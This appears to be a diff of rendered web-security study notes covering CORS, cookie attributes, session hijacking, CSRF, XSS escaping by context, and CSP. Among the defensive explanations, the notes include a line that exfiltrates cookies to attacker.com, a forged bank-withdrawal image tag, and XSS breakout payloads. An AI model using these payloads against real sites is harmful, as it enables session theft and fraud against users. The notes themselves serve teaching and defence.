+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>Sec-WebSocket-Protocol: chat
+</code></pre></div></p>
+<h4 id="cors">CORS<a class="headerlink" href="#cors" title="Permanent link">&para;</a></h4>
+<p>Once the browser detects there is an cross-origin AJAX request, will automatic add some more request header attribute. And the server found this addional information, respect the CORS protocal send back the response, they can communicate.</p>
+<p>The browser divided CORS request into two categories, simple request and not-so-simple request.If a request met the following two conditions, it is a simple request, otherwise, it is a not-so-simple request.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>1. request method is HEAD, GET or POST
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>2. request header attribute does not exceed the following fields:
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>* Accept
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>* Accept-Language
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>* Content-Language
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>* Last-Event-ID
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>* Content-Type：application/x-www-form-urlencoded、multipart/form-data、text/plain(other value is not obey)
+</code></pre></div>
+<p><strong>Simple request</strong> <br />
+For the simple request, the browser will auto add an Origin field on the header of request, the origin contain current scheme, domain and port.</p>
+<p>If the server want to response this origin, it must add some response header:  </p>
+<ul>
+<li>Access-Control-Allow-Origin. It can be the origin of request header, or a <code>*</code> means any domain</li>
+<li>Access-Control-Allow-Credentials. If this is <code>true</code>, means the ajax request can contains the cookie</li>
+<li>Access-Control-Expose-Headers. The <code>getResponseHeader()</code> of a <code>XMLHttpRequest</code> object can only get 6 basic response header field, if want more, you must add the field to this attribute.</li>
+</ul>
+<p><strong>Not-so-simple request</strong> <br />
+For the not-so-simple request,the browser will send a preflight requst before the formal request.</p>
+<p>The preflight request is an <code>OPTIONS</code> request, and it will add <code>Access-Control-Request-Method</code> field express the formal request's method, add <code>Access-Control-Request-Headers</code> if the formal request has some other request header fields.</p>
+<p>The server receive preflight request, will check <code>Origin</code>, <code>Access-Control-Request-Method</code> and <code>Access-Control-Request-Headers</code>field to decide whether allow this cross-origin request. If allowed, the response header should be:</p>
+<ul>
+<li>Access-Control-Allow-Methods. It means all the allow request method of the server.</li>
+<li>Access-Control-Allow-Headers. It means all request header fields the server can support.</li>
+<li>Access-Control-Allow-Credentials. Same as simple request.</li>
+<li>Access-Control-Max-Age. It specify the validity period of this preflight request.</li>
+</ul>
+<p>Once the server allow this preflight request, the later CORS request will all same as simple request.</p>
+<h2 id="session-attack">Session Attack<a class="headerlink" href="#session-attack" title="Permanent link">&para;</a></h2>
+<h3 id="session-and-cookie">Session and Cookie<a class="headerlink" href="#session-and-cookie" title="Permanent link">&para;</a></h3>
+<p>The Http protocol is statusless, we need the server keeps a set of data related to a user's current browsing session, like Logins,Shopping carts,User tracking etc.The most common way is Cookies. Session desired these properties:</p>
+<ul>
+<li>Browser remember user(so user doesn't need to repeatedly log in)</li>
+<li>User cannot modify session cookie to login as another user</li>
+<li>Session cookies are not valid forever</li>
+<li>Session can be deleted on the server-side</li>
+<li>Session should expire after some time, e.g. 30 days</li>
+</ul>
+<p>When the server Set-Cookie, cookie have some basic attributes:</p>
+<ul>
+<li>Expires, Specifies expiration date. If no date, then lasts for "browser session". If set to <code>Thu, 01 Jan 1970 00:00:00 GMT</code> will delete this cookie name and its value</li>
+<li>Path, Scope the "Cookie" header to a particular request path prefix, e.g. <code>Path=/docs</code> will match <code>/docs</code> and <code>/docs/web</code></li>
+<li>Domain, Allows the cookie to be scoped to a "broader domain"(within the same registrable domain), e.g. <code>sub.a.com</code> can set cookies for <code>a.com</code></li>
+</ul>
+<p>The Cookies setting don't obey Same Origin Policy, because cookies were created before Same Origin Policy, they have different security model. Sometimes Cookies are more restrictive than Same Origin Policy, like <code>Path</code> partions cookies by path, but is ineffective, because pages on same origin can access each other's DOMs, run code in each other's contexts;The other time Cookies are less restrictive than Same Origin Policy, like Pages with same hostname can share the cookies, the protocol and port are ignored, and different origins(e.g. subdomain) can mess with each others cookies.</p>
+<h3 id="session-hijacking">Session hijacking<a class="headerlink" href="#session-hijacking" title="Permanent link">&para;</a></h3>
+<h4 id="over-http-steal-cookie">Over Http steal cookie<a class="headerlink" href="#over-http-steal-cookie" title="Permanent link">&para;</a></h4>
+<p>Sending cookies over unencrypted HTTP is a very bad idea.If anyone sees the cookie, they can use it to hijack the user's session, attacker sends victim's cookie as if it was their own, server will be fooled.  </p>
+<p>How to mitigation this session hijacking, use the <code>Set-Cookie: key=value; Secure</code> cookie attribute will prevent cookie from being sent over unencrypted HTTP connections. An even better solution is use https for entire website.</p>
+<h4 id="xss-steal-cookie">XSS steal cookie<a class="headerlink" href="#xss-steal-cookie" title="Permanent link">&para;</a></h4>
+<p>XSS is Cross Site Scripting. What if attacker can insert their code into the webpage? At this point, they can easily exfiltrate the user's cookie. <code>new Image().src='http://attacker.com/steal?cookie=' + document.cookie</code>.</p>
+<p>The <code>HttpOnly</code> cookie attribute can prevent cookie from being read from JavaScript, use <code>Set-Cookie: key=value; Secure; HttpOnly</code>.</p>
+<h3 id="csrf">CSRF<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h3>
+<p>Consider this HTML embedded in attacker.com:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Welcome to your account!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;https://bank.com/avatar.png&#39;</span> <span class="p">/&gt;</span>
+</code></pre></div>
+The browser helpfully includes bank.com cookies in all requests to bank.com, even though the request originated from attacker.com, attacker.com can embed user's real avatar from bank.com. What if the embedded HTML is <code>&lt;img src='https://bank.com/withdraw?from=bob&amp;to=mallory&amp;amount=1000'&gt;</code>. Attack which forces an end user to execute unwanted actions on a web app in which they're currently authenticated, effective even when attacker can't read the HTTP response. This kind of hijacking is called Cross-Site Request Forgery(CSRF).</p>
+<p>How to mitigate CSRF?</p>
+<p>The answer is use SameSite cookie attributes, this will prevent cookie from being sent with requests initiated by other sites.  </p>
+<ul>
+<li>SameSite=None - default, always send cookies</li>
+<li>SameSite=Lax - withhold cookies on subresource requests originating from other sites, allow them on top-level requests</li>
+<li>SameSite=Strict - only send cookies if the request originates from the website that set the cookie</li>
+</ul>
+<p>This table discribe when the request send to another site, different SameSite attribute send cookie or not:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Request type</th>
+<th>Request example</th>
+<th style="text-align: center;">None</th>
+<th style="text-align: center;">Lax</th>
+<th style="text-align: center;">Strict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">Link</td>
+<td><code>&lt;a href="..."&gt;&lt;/a&gt;</code></td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Not</td>
+</tr>
+<tr>
+<td style="text-align: center;">Preload</td>
+<td><code>&lt;link rel="prerender" href="..."/&gt;</code></td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Not</td>
+</tr>
+<tr>
+<td style="text-align: center;">Form Get</td>
+<td><code>&lt;form method="GET" action="..."&gt;</code></td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Not</td>
+</tr>
+<tr>
+<td style="text-align: center;">Form Post</td>
+<td><code>&lt;form method="POST" action="..."&gt;</code></td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Not</td>
+<td style="text-align: center;">Not</td>
+</tr>
+<tr>
+<td style="text-align: center;">iframe</td>
+<td><code>&lt;iframe src="..."&gt;&lt;/iframe&gt;</code></td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Not</td>
+<td style="text-align: center;">Not</td>
+</tr>
+<tr>
+<td style="text-align: center;">AJAX</td>
+<td><code>$.get("...")</code></td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Not</td>
+<td style="text-align: center;">Not</td>
+</tr>
+<tr>
+<td style="text-align: center;">Image</td>
+<td><code>&lt;img src="..."&gt;</code></td>
+<td style="text-align: center;">Send</td>
+<td style="text-align: center;">Not</td>
+<td style="text-align: center;">Not</td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Never trust data from the client</li>
+<li>Don't use broken cookie Path attribute for security</li>
+<li>Use SameSite=Lax to protect against CSRF attacks</li>
+<li>If you remember one thing: set your cookie like this:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Set-Cookie: key=value; Secure; HttpOnly; Path=/;
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>SameSite=Lax; Expires=Fri, 1 Nov 2021 00:00:00 GMT
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>(Expires should be set to 30days later)
+</code></pre></div></li>
+</ul>
+<h2 id="xss">XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h2>
+<p>XSS(cross site scripting) is a code injection vulnerablity, it's caused when untrusted user data unexpected becomes code. The unexpected code is JavaScript in an HTML document. If successful, attacker gains the ablility to do anything the target can do through their browser, like view/exfiltrate their cookies, send any HTTP request to the site with the user's cookies!</p>
+<p>XSS is prevalent, the web has so many different languages, data can be used in many different contexts! Even within HTML, there are at least 5 contexts to understand. And each context has different "control characters". If you slip up in even one place, you're completely vulnerable!</p>
+<h3 id="attack-type">Attack Type<a class="headerlink" href="#attack-type" title="Permanent link">&para;</a></h3>
+<p>Usually there are two types attack, reflected XSS attack and stored XSS attack.</p>
+<p>In reflected XSS, the attack code is placed into the HTTP request itself, the attacker goal is to find a URL that can make target visit, URL includes attack code. So the limitation is attack code must be added to the URL path or query parameters.</p>
+<p>In stored XSS, the attack code is persisted into the database, the attacker goal is to use any means to get attack code into the database. Once there, server includes it in all pages sent to clients.</p>
+<p>If the server code is:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">source</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="sb">`</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="sb">    &lt;h1&gt;</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="sb">    </span><span class="si">${</span><span class="nx">source</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="sb">`Hi </span><span class="si">${</span><span class="nx">source</span><span class="si">}</span><span class="sb"> reader!`</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="si">}</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="sb">    Login to your bank account:</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="sb">    &lt;/h1&gt;</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="sb">  `</span><span class="p">)</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="p">})</span>
+</code></pre></div></p>
+<p>The attack url can be:<br />
+<code>http://localhost:4000/?source=%3Cscript%3Ealert(%27hey%20there!%27)%3C/script%3E</code></p>
+<p>This is a typical reflected XSS, the server does not stored attack code into database, attacker need to send url to goal.</p>
+<h3 id="attack-example">Attack Example<a class="headerlink" href="#attack-example" title="Permanent link">&para;</a></h3>
+<h4 id="html-elements">HTML elements<a class="headerlink" href="#html-elements" title="Permanent link">&para;</a></h4>
+<p><div class="highlight"><span class="filename">HTML template</span><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Search result for USER_DATA_HERE<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</code></pre></div>
+<div class="highlight"><span class="filename">Resulting page(no escape)</span><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Search result for <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</code></pre></div>
+what is the fix?  </p>
+<ul>
+<li>change all <code>&lt;</code> to <code>&amp;lt;</code></li>
+<li>change all <code>&amp;</code> to <code>&amp;amp;</code></li>
+</ul>
+<h4 id="html-attributes">HTML attributes<a class="headerlink" href="#html-attributes" title="Permanent link">&para;</a></h4>
+<p><div class="highlight"><span class="filename">HTML template</span><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;avatar.png&#39;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#39;USER_DATA_HERE&#39;</span> <span class="p">/&gt;</span>
+</code></pre></div>
+<div class="highlight"><span class="filename">Resulting page(no escape)</span><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;avatar.png&#39;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#39;Feross&#39;</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#39;alert(document.cookie)&#39;</span> <span class="p">/&gt;</span>
+</code></pre></div>
+what is the fix?  </p>
+<ul>
+<li>change all <code>'</code> to <code>&amp;apos;</code></li>
+<li>change all <code>"</code> to <code>&amp;quot;</code></li>
+<li>change all <code>&amp;</code> to <code>&amp;amp;</code></li>
+</ul>
+<p>what about set html attributes without quotes?
+<div class="highlight"><span class="filename">HTML template</span><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;avatar.png&#39;</span> <span class="na">alt</span><span class="o">=</span><span class="s">USER_DATA_HERE</span> <span class="p">/&gt;</span>
+</code></pre></div>
+<div class="highlight"><span class="filename">Resulting page(escaping ' and double quotes and &)</span><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">avatar.png</span> <span class="na">alt</span><span class="o">=</span><span class="s">Feross</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(document.cookie)</span> <span class="p">/&gt;</span>
+</code></pre></div>
+It's a bad idea! Should always quotes attributes!</p>
+<p><div class="highlight"><span class="filename">HTML template</span><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&#39;handleHover(USER_DATA_HERE)&#39;</span><span class="p">&gt;</span>
+</code></pre></div>
+<div class="highlight"><span class="filename">Resulting page(escaping ' and double quotes)</span><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&#39;handleHover(); alert(document.cookie)&#39;</span><span class="p">&gt;</span>
+</code></pre></div></p>
+<p>what is the fix? escape one more char <code>;</code></p>
+<p>For most attributes, escaping attributes is sufficient. But certain attributes like <code>src</code>,<code>href</code>,<code>data:</code>,<code>javascript:</code> can never be safe, even if you escape the attribute value!</p>
+<h4 id="script-elements">Script elements<a class="headerlink" href="#script-elements" title="Permanent link">&para;</a></h4>
+<p><div class="highlight"><span class="filename">HTML template</span><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;USER_DATA_HERE&#39;</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="w">  </span><span class="nx">alert</span><span class="p">(</span><span class="sb">`Hi there, </span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<div class="highlight"><span class="filename">Resulting page(no escape)</span><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Feross&#39;</span><span class="p">;</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="w"> </span><span class="c1">//&#39;</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="w">  </span><span class="nx">alert</span><span class="p">(</span><span class="sb">`Hi there, </span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+If we just change all <code>'</code> to <code>\'</code> , <code>"</code> to <code>\"</code>, it still work!<br />
+The user input can be <code>Feross\'; alert(document.cookie) //</code> .</p>
+<p>If we change one more <code>\</code> to <code>\\</code>, it still broken!<br />
+The user input can be <code>&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;</code>.</p>
+<p>what is the fix?</p>
+<ul>
+<li>Hex encode user data to produce a string with characters 0-9, A-F.</li>
+<li>Include it inside a JavaScript string</li>
+<li>Then, decode the hex string</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">hexDecode</span><span class="p">(</span><span class="s1">&#39;HEX_ENCODED_USER_DATA&#39;</span><span class="p">)</span>
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="w">  </span><span class="nx">alert</span><span class="p">(</span><span class="sb">`Hi there, </span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>Now if the user still input <code>&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;</code>, the result will be <code>hexDecode('3c2f736372697074...')</code>. It works!</p>
+<p>Another solution is use a <code>&lt;template&gt;</code> tag to store data that won't visibly render, then the escaping rules are simple and the same as for HTML elements, just HTML encode <code>&lt;</code> and <code>&amp;</code> characters.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="p">&lt;</span><span class="nt">template</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;username&#39;</span><span class="p">&gt;</span>HTML_ENCODED_USER_DATA<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">).</span><span class="nx">textContent</span>
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="w">  </span><span class="nx">alert</span><span class="p">(</span><span class="sb">`Hi there, </span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="never-safe-context">Never safe context<a class="headerlink" href="#never-safe-context" title="Permanent link">&para;</a></h4>
+<p>There are some context never safe, we should avoid!
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">USER_DATA_HERE</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="cm">&lt;!-- USER_DATA_HERE --&gt;</span>
+<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
+<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="p">&lt;</span><span class="nt">USER_DATA_HERE</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;/&#39;</span><span class="p">&gt;</span>Link<span class="p">&lt;/</span><span class="nt">USER_DATA_HERE</span><span class="p">&gt;</span>
+<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
+<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">USER_DATA_HERE</span><span class="o">=</span><span class="s">&#39;some value&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
+<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span><span class="nt">USER_DATA_HERE</span><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+</code></pre></div></p>
+<h3 id="xss-defenses">XSS defenses<a class="headerlink" href="#xss-defenses" title="Permanent link">&para;</a></h3>
+<p>The code injection is caused when untrusted user data unexpectedly becomes code. So we need to escape or sanitize user input before combing it with code(the HTML template).</p>
+<p><strong>where untrusted data comes from</strong></p>
+<ul>
+<li>HTTP request from user, like query parameters, form fields, headers, cookies, file uploads</li>
+<li>Data from a database. When you works in a large team, who knows how the data got into the database?</li>
+<li>Third-party services. We don't know it's safe, maybe the service gets hacked and sending unsafe data</li>
+</ul>
+<p><strong>when to escape</strong></p>
+<p>On the way into the database or on the way out at render time? We should always on the way out at render time.</p>
+<p>Because even if you are sure that you control all possible ways for data to get into the database, you don't know in advance what context the data will appear in. Different contexts have different control characters.</p>
+<p><strong>how to escape</strong></p>
+<p>Use your framework's built-in HTML escaping functionality, if bugs are found, you will get the fix for free! Also, make sure you know the contexts where it is safe to use the output.</p>
+<h3 id="csp">CSP<a class="headerlink" href="#csp" title="Permanent link">&para;</a></h3>
+<p>The Same Origin Policy is to prevent some other sites making certain requests to our site. CSP is inverse, it prevent our site from make requests to other sites.</p>
+<p>CSP is an added layer of security against XSS, even if attacker code is running on user's browser in our site's context, we can limit the damage they can do.</p>
+<p>CSP blocks HTTP requests which would violate the policy. Add the Content-Security-Policy header to an HTTP response to control the resources the page is allowed to load.</p>
+<h4 id="using-csp">Using CSP<a class="headerlink" href="#using-csp" title="Permanent link">&para;</a></h4>
+<p>The snippet below shows a CSP response heeader with a minimal policy configuration:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="err">Content-Security-Policy: script-src &#39;self&#39;</span>
+</code></pre></div>
+<p>The server includes this header on the response that sends an HTML page to the browser. The policy configuration tells the browser that ths page can only execute scripts coming from its own origin.This means that if the application is running on <code>https://example.com/app</code>, the browser only executes remote JavaScript code comming from <code>https://example.com</code>, anyting else is blocked, include <code>*.example.com</code>.</p>
+<p>For example:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="cm">&lt;!-- Not allowed! Inline scripts are prevented --&gt;</span>
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;none.png&quot;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;evilCode()&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="cm">&lt;!-- Not allowed! Inline scripts are prevented  --&gt;</span>
+<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">evilCode</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="cm">&lt;!-- Not allowed! Remote script comes from a different origin  --&gt;</span>
+<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://evil.com/code.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="cm">&lt;!-- Allowed! Relative URLs are loaded from the same origin --&gt;</span>
+<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/code.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div></p>
+<h4 id="directives-and-values">Directives and Values<a class="headerlink" href="#directives-and-values" title="Permanent link">&para;</a></h4>
+<p>The CSP syntax is:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="err">Content-Security-Policy: &lt;policy-directive&gt;; &lt;policy-directive&gt;</span>
+</code></pre></div>
+Where <code>&lt;policy-directive&gt;</code> consists of: <code>&lt;directive&gt; &lt;value&gt; &lt;value2&gt;</code> with no internal punctuation. </p>
+<p>The CSP fetch directives control the locaions from which certain resource types may be loaded. Some commonly used directives are as follows:</p>
+<ul>
+<li>default-src, Serves as a fallback for other fetch directives</li>
+<li>connect-src, Restricts sources from "script interfaces": fetch, XHR, WebSocket, <code>&lt;a ping&gt;</code> etc.</li>
+<li>frame-src, Restricts sources for nested browsing contexts: <code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code></li>
+<li>img-src, Restricts sources for images, favicons</li>
+<li>script-src, Restricts sources for <code>&lt;script&gt;</code> elements</li>
+<li>style-src, Restricts sources for <code>&lt;style&gt;</code> and <code>&lt;link rel='stylesheet'&gt;</code> elements</li>
+<li>media-src, Restricts sources for media: <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;track&gt;</code></li>
+</ul>
+<p>There are also some directives do not inherit from <code>defalut-src</code>, include <code>base-uri</code>, <code>form-action</code>, <code>frame-ancestors</code>, <code>navigate-to</code>, <code>upgrade-insecure-requests</code>.</p>
